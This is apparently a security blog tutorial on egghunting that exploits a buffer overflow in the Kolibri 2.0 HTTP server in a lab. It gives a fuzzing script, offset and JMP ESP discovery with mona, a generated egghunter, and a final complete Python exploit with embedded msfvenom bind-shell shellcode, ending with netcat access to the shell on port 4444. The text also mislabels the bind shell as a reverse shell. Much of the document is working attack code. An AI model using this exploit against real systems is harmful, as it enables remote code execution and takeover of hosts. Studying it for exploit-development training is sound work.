---
title: Egghunting - Exploiting the Kolibri 2.0 HTTP Server
date: 2024-07-02 15:00:00 +0200
---
# What is egghunting?
Egghunting is a technique used in Buffer overflow attacks in which the buffer space after gaining EIP control is limited.
It relies on using an egghunter,which is a set of programmatic instructions translated to opcode.
The egghunter works by scanning the memory space of the program to find a two times repeated ASCII "egg".
Upon finding the egg (which we should place before our shellcode) it redirects the execution flow to the shellcode.
You can find more on egghunters [here.](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

# Kolibri 2.0 HTTP Server
You can find the vulnerable application [here.](https://www.exploit-db.com/apps/4d4e15b98e105facf94e4fd6a1f9eb78-Kolibri-2.0-win.zip)
It is a simple old school HTTP Server with a vulnerable HTTP request buffer.Multiple headers are overflowable and point to different memory locations.
For easier understanding badcharacter analysis will be left out.They are different between the HTTP headers.
badchars: \x00\x0d\x0a\x3d\x20\x3f
As we will see later by mona findmsp analysis after the injection of a msf pattern, User-Agent header has no bad characters in the ASCII range,which 
is why the shellcode will be encoded in x86/alpha_mixed.
A thing to keep in mind is that any and all payloads that we will be sending can not contain a bad character.
# Fuzzing for buffer size
The first thing we want to check is when the buffer will overflow.
A small python script for incrementally increasing the size of the payload will suffice.
```python
#!/usr/bin/python3
import socket

buf = b"A" * 100
lastlen = ""
while True:
    try:
        lastlen = str(len(buf))
        print("Fuzzing with buffer length " + lastlen)
        buffer = (
            b"HEAD /" + b" HTTP/1.1\r\n"
            b"Host: 192.168.111.128:8080\r\n"
            b"User-Agent: " + buf + b"\r\n"
            b"Keep-Alive: 115\r\n"
            b"Connection: keep-alive\r\n\r\n"
        )

        # Send the crafted HTTP request
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.122.3", 8080))
        s.send(buffer)
        s.close()

        buf += b"A" * 100  # Increment the buffer length for the next iteration
    except Exception as e:
        print("Possible last buffer length was " + lastlen)
        break

```
![fuzzing](assets/fuzzingForBufferSize.png)
*As we can see on the left,the EIP register was overwriten by a buffer that is long 600 bytes.*

# Finding the EIP offset
So to actually hijack the execution flow,we need to know how much can we write to a buffer untill we hit the EIP.
We can do that by generating a pattern using a metasploit ruby script which we will send as the payload,and then let
mona do pattern analysis on the memory space by running    
`!mona findmsp`
To generate the pattern use the pattern_create metasploit script.
![msfpattern](assets/creatingMSFpattern.png)
![findeipoffset](assets/eipOffset.png)

To confirm the offset is at 515 , we made a payload with four Bs and as we can see the EIP register has been overwritten with ASCII 
hex codes of B.
![eipoverwrite](assets/EIPoverwritten.png)


# Finding a pointer to esp
To redirect the execution flow we must find a jmp instruction to the ESP register.
We can do that by running the mona command `!mona jmp -r esp`.
![jmpesp](assets/jmpESP.png)
I will be using the first address.
To check for it we will put a breakpoint on it.
After putting the address in our payload  and executing it ,we see that we have hit our breakpoint.
![eippointingtoesp](assets/eippointingtoesp.png)
If we step through , we will get redirected to our two B's located at esp.
The small amount of memory we have is enough for us to embed some "shortjump" opcode `\xEB\`,and the length we wish to jump backwards.
We will be jumping back 60(xC4) bytes,which will land us on our A's(memory that we control) where we will embed our egghunter later.

# Generating the egghutner
All that is left is to generate the egghunter (this one is in particular 32 bytes in size) and append it to our initial payload.
We can generate it by running `!mona egg -t pwnd`.It lets you pick a custom tag (which in this case is pwnd).

After running the payload with the egghunter,by placing a breakpoint and steping into the next instruction we will be able to find
the egghunter in memory.
![egghunterinmemory](assets/foundegghunter.png)


# Stage 2 : Injecting shellcode into the User-Agent header
By injecting the msf pattern into the User-Agent and running `!mona findmsp ` we will see that the pattern stayed intact and has been found 3 times in memory.
This means the only thing left is to generate ASCII encoded shellcode and the payload is complete.
The payload i picked is a standard windows reverse shell.
`msfvenom -p windows/shell_bind_tcp LPORT=4444 -f python -e x86/alpha_mixed`


The final exploit:

```python
#!/usr/bin/python3

import socket
import os
import sys
# badchars: \x00\x0d\x0a\x3d\x20\x3f  | badchars for User-Agent are different,so to avoid doing more work the shellcode will be ascii encoded
# since msf ascii patern remained unchanged

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += b"\xef\xb8\x70\x77\x6e\x64\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#                      p   w   n   d        egg

# 7C9D30D7 FFE4 JMP ESP (adress to overwrite eip(SHELL32.DLL)) |offset to eip is 515|   opcode for short jump (c4 = 60 bytes) (jumps 60 bytes back into buffer)
stage1 = b"A" * 478 + egghunter + b"A" * 5 + b"\xd7\x30\x9d\x7c" + b"\xeb\xc4"


shellcode = b""
shellcode += b"\x89\xe3\xdb\xd8\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a"
shellcode += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
shellcode += b"\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41"
shellcode += b"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"
shellcode += b"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x69"
shellcode += b"\x6c\x6d\x38\x6b\x32\x43\x30\x45\x50\x53\x30\x71"
shellcode += b"\x70\x6e\x69\x69\x75\x45\x61\x4f\x30\x42\x44\x4c"
shellcode += b"\x4b\x50\x50\x70\x30\x4c\x4b\x50\x52\x76\x6c\x4e"
shellcode += b"\x6b\x32\x72\x37\x64\x4e\x6b\x61\x62\x76\x48\x64"
shellcode += b"\x4f\x78\x37\x72\x6a\x76\x46\x74\x71\x59\x6f\x4c"
shellcode += b"\x6c\x35\x6c\x51\x71\x73\x4c\x36\x62\x36\x4c\x75"
shellcode += b"\x70\x7a\x61\x38\x4f\x56\x6d\x35\x51\x6b\x77\x39"
shellcode += b"\x72\x5a\x52\x63\x62\x53\x67\x6c\x4b\x76\x32\x72"
shellcode += b"\x30\x4e\x6b\x32\x6a\x45\x6c\x6e\x6b\x62\x6c\x36"
shellcode += b"\x71\x61\x68\x49\x73\x57\x38\x45\x51\x4b\x61\x62"
shellcode += b"\x71\x6c\x4b\x72\x79\x45\x70\x67\x71\x69\x43\x4c"
shellcode += b"\x4b\x52\x69\x32\x38\x4a\x43\x46\x5a\x47\x39\x6e"
shellcode += b"\x6b\x34\x74\x6c\x4b\x46\x61\x68\x56\x65\x61\x4b"
shellcode += b"\x4f\x6c\x6c\x4b\x71\x78\x4f\x36\x6d\x65\x51\x6a"
shellcode += b"\x67\x70\x38\x6d\x30\x44\x35\x6c\x36\x74\x43\x43"
shellcode += b"\x4d\x58\x78\x47\x4b\x73\x4d\x54\x64\x51\x65\x79"
shellcode += b"\x74\x61\x48\x6e\x6b\x61\x48\x61\x34\x35\x51\x79"
shellcode += b"\x43\x61\x76\x4c\x4b\x36\x6c\x42\x6b\x4e\x6b\x43"
shellcode += b"\x68\x37\x6c\x63\x31\x6b\x63\x4c\x4b\x63\x34\x4e"
shellcode += b"\x6b\x55\x51\x68\x50\x6f\x79\x31\x54\x46\x44\x67"
shellcode += b"\x54\x63\x6b\x43\x6b\x70\x61\x62\x79\x51\x4a\x66"
shellcode += b"\x31\x79\x6f\x6d\x30\x71\x4f\x43\x6f\x50\x5a\x6e"
shellcode += b"\x6b\x77\x62\x4a\x4b\x6e\x6d\x43\x6d\x42\x48\x55"
shellcode += b"\x63\x65\x62\x67\x70\x75\x50\x30\x68\x74\x37\x70"
shellcode += b"\x73\x65\x62\x71\x4f\x72\x74\x75\x38\x42\x6c\x33"
shellcode += b"\x47\x74\x66\x67\x77\x39\x6f\x68\x55\x48\x38\x7a"
shellcode += b"\x30\x77\x71\x47\x70\x67\x70\x71\x39\x69\x54\x76"
shellcode += b"\x34\x76\x30\x71\x78\x64\x69\x6b\x30\x70\x6b\x35"
shellcode += b"\x50\x79\x6f\x5a\x75\x43\x5a\x53\x38\x56\x39\x62"
shellcode += b"\x70\x69\x72\x6b\x4d\x51\x50\x72\x70\x73\x70\x52"
shellcode += b"\x70\x50\x68\x79\x7a\x74\x4f\x79\x4f\x79\x70\x49"
shellcode += b"\x6f\x38\x55\x6a\x37\x71\x78\x44\x42\x45\x50\x37"
shellcode += b"\x61\x53\x6c\x4d\x59\x68\x66\x61\x7a\x46\x70\x63"
shellcode += b"\x66\x76\x37\x51\x78\x48\x42\x69\x4b\x44\x77\x31"
shellcode += b"\x77\x49\x6f\x48\x55\x76\x37\x43\x58\x78\x37\x48"
shellcode += b"\x69\x65\x68\x59\x6f\x4b\x4f\x79\x45\x33\x67\x65"
shellcode += b"\x38\x51\x64\x78\x6c\x67\x4b\x39\x71\x49\x6f\x49"
shellcode += b"\x45\x30\x57\x6c\x57\x61\x78\x61\x65\x72\x4e\x42"
shellcode += b"\x6d\x65\x31\x39\x6f\x68\x55\x50\x68\x50\x63\x70"
shellcode += b"\x6d\x73\x54\x47\x70\x6d\x59\x48\x63\x30\x57\x71"
shellcode += b"\x47\x42\x77\x70\x31\x6c\x36\x72\x4a\x42\x32\x30"
shellcode += b"\x59\x76\x36\x7a\x42\x79\x6d\x55\x36\x6b\x77\x30"
shellcode += b"\x44\x75\x74\x45\x6c\x46\x61\x76\x61\x4c\x4d\x53"
shellcode += b"\x74\x75\x74\x46\x70\x69\x56\x33\x30\x37\x34\x72"
shellcode += b"\x74\x72\x70\x72\x76\x30\x56\x42\x76\x47\x36\x50"
shellcode += b"\x56\x62\x6e\x66\x36\x56\x36\x70\x53\x76\x36\x33"
shellcode += b"\x58\x51\x69\x7a\x6c\x55\x6f\x6f\x76\x49\x6f\x79"
shellcode += b"\x45\x4c\x49\x4b\x50\x42\x6e\x33\x66\x50\x46\x69"
shellcode += b"\x6f\x74\x70\x45\x38\x66\x68\x6d\x57\x37\x6d\x53"
shellcode += b"\x50\x69\x6f\x69\x45\x4f\x4b\x78\x70\x4c\x75\x4e"
shellcode += b"\x42\x42\x76\x30\x68\x6d\x76\x5a\x35\x6f\x4d\x4d"
shellcode += b"\x4d\x6b\x4f\x68\x55\x57\x4c\x77\x76\x63\x4c\x75"
shellcode += b"\x5a\x6f\x70\x79\x6b\x4d\x30\x52\x55\x75\x55\x6f"
shellcode += b"\x4b\x70\x47\x66\x73\x52\x52\x62\x4f\x52\x4a\x67"
shellcode += b"\x70\x42\x73\x59\x6f\x78\x55\x41\x41"


stage2 = b"pwndpwnd" + shellcode


buffer = (
    b"HEAD /" + stage1 + b" HTTP/1.1\r\n"
    b"Host: 192.168.111.128:8080\r\n"
    b"User-Agent:  " + stage2 + b"\r\n"
    b"Keep-Alive: 115\r\n"
    b"Connection: keep-alive\r\n\r\n"
)

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.122.3", 8080))
expl.send(buffer)
expl.close()
```

Runnning `netstat -an` on the WindowsXP machine we see that it is listening on our dedicated port 4444.
![netstat](assets/netstat.png)
Running `nc 192.168.122.3 4444` we get a fully functional reverse shell.
![revshell](assets/revshell.png)
